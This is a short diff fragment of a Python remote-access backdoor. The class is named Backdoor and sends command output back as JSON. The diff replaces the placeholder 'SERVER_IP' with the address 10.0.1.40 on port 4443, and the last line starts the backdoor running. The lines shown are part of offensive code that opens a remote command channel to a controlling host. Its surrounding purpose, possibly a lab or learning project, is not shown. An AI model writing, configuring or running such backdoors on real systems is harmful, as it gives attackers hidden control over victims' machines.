@@ -126,5 +126,5 @@ class Backdoor:
             self.send_json({"type": "command_output", "data": command_output})
 
 
-backdoor = Backdoor("SERVER_IP", 4443)
+backdoor = Backdoor("10.0.1.40", 4443)
 backdoor.run()
